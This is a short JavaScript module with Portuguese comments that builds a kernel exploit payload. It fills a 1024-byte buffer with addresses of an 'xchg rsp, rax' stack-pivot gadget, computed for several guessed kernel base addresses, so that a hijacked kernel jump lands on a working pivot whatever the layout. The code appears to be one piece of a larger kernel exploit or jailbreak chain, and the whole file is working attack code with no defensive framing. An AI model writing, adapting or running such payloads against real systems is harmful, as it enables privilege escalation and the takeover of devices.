import { CONFIG, GADGETS } from './config.mjs';

// Constrói um buffer contendo ponteiros para múltiplas bases possíveis
export function build_rainbow_payload() {
    const size = 0x400; // Tamanho fixo (1024 bytes)
    const buffer = new Uint32Array(size / 4);
    const view = new DataView(buffer.buffer);

    // O Padrão Arco-Íris:
    // Offset 0: Pivot da Base A
    // Offset 8: Pivot da Base B
    // Offset 16: Pivot da Base C
    // ...
    
    // Se o Kernel pular para o Offset 0, testa Base A.
    // Se pular para Offset 8 (devido a desalinhamento), testa Base B.
    // Isso aumenta nossas chances estatísticas.

    let offset = 0;
    while(offset < size) {
        for (let base of CONFIG.TARGET_BASES) {
            if (offset + 8 > size) break;
            
            // Calcula endereço absoluto do Pivot para esta base
            // Pivot: xchg rsp, rax
            let gadget = base + GADGETS.xchg_rsp_rax;
            
            view.setBigUint64(offset, gadget, true); // Little Endian
            offset += 8;
        }
    }
    
    return buffer;
}
